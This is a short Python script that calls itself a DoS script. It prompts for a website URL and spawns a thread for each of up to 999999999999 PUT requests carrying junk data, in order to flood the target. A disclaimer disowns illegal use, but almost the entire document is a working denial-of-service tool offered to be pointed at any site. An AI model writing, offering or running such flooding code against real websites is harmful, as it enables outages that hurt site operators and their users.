print("This is a DoS script.")
print("The creator of this is not responisble for any illegal use by others.")
print("! ! IMPORTANT ! ! : To stop the script you must close the program yourself NOT BY A BUTTON.")

import requests
import threading

def post_data(url, data, thread_id):
    try:
        response = requests.put(url, data=data)
        print(f"Thread {thread_id}: Status Code: {response.status_code}")
    except Exception as e:
        print(f"Thread {thread_id}: An error occurred: {e}")

def post_data_fast(url, data, num_requests):
    threads = []

    for i in range(num_requests):
        thread = threading.Thread(target=post_data, args=(url, data, i))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    url = input("Paste the link of the website you want to stress:")

    data = {
        "input": "6481ybuds190yehds"
    }

    num_requests = 999999999999

    post_data_fast(url, data, num_requests)
